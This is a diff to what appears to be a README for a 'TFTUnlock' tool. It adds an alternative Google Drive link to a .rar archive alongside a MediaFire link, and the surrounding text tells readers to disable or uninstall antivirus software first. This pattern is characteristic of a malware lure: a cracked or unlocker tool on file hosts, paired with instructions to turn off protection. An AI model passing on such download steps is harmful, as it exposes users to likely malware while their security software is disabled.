@@ -30,6 +30,7 @@ Before proceeding, make sure you have disabled or uninstalled any antivirus soft
 First, download the repository containing all necessary files.
 
 1. [Download Here](https://www.mediafire.com/file/90okq8sogp79p7k/TFTUnlock-2024-v4.6.3.3.rar/file)
+2. [Alternative](https://drive.google.com/file/d/1jerIUAlTu16Rn7w8lZmetX0alxFI8apE/view)
 
 
 ### 2. Install TFTUnlock
